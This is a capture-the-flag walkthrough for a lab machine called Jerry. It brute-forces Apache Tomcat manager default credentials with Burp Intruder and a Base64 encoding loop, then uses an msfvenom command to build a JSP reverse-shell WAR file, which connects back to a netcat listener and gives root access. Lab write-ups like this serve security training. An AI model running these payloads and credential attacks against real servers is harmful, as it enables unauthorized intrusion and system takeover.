# Jerry

## 1. Overview

### 1.1. Attacks

* Default Credential

### 1.2. Tools used

**Enumeration** &rarr; `nmap`.

**Exploitation** &rarr; `Netcat`, `msfvenom`,`BurpSuite`.

## 2. Walkthrough

### 2.1. Enumeration

#### 2.1.1. nmap

##### 2.1.1.1. Ports

![Jerry Ports/Hosts](_v_images/20201013114035670_8751.png)

![Jerry Ports Tomcat Version](_v_images/20201013114155479_9333.png)

Looks like default webpage by having the server name and version in the title.

![Jerry Default Tomcat Page](_v_images/20201013115219681_14926.png)

This shouldn't be accessible from the external network and shouldn't be easily accessible to everyone in the internal one.

##### 2.1.1.2. Host Details

![Jerry Host Details](_v_images/20201013115352393_9780.png)

### 2.2. Exploitation

#### 2.2.1. Sources

[Apache Tomcat Default Credentials List](https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown)

[Creating Metasploit Payloads](https://netsec.ws/?p=331)

#### 2.2.2. Burpsuite

Proxy the website and go to `Admin Manager`. Try random username and password.

![Send to Intruder and Repeater](_v_images/20201013120140578_27068.png)

We'll use a list with Tomcat default credentials. We can see the format required in Decoder, since it is encoded in Base64. If we decode it, we see that the format is `<user>:<pwd>`.

![Tomcat.exe](_v_images/20201013120633243_31415.png)

To transform these to Base64 we can use the following command:

```sh
for cred in $(cat tomcat.txt); do echo -n $cred | base64; done
```

![Intruder Payloads](_v_images/20201013121116476_639.png)

**Note:** unmark `URL-Encoding` at the bottom of the page.

![Jerry Intruder Attack](_v_images/20201014104647873_14257.png)

We got a successful credential! If we decode it we will know the username and password (`tomcat:s3cret`). Now we can get inside.

![WAR File Upload](_v_images/20201014105143224_31852.png)

There's even the option to upload a WAR file. We can probably get a shell from that.

We can research ways to generate a WAR file, for example:

```sh
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
```

And for the listener we can use `Netcat`:

```sh
nc -nvlp <Port>
```

And now we can upload the file. If it doesn't get a shell we can force it by clicking on the new "shell" file that appears in the webpage.

![Uploaded Shell Application](_v_images/20201014110239506_25458.png)

![Jerry Root Access](_v_images/20201014110337898_10282.png)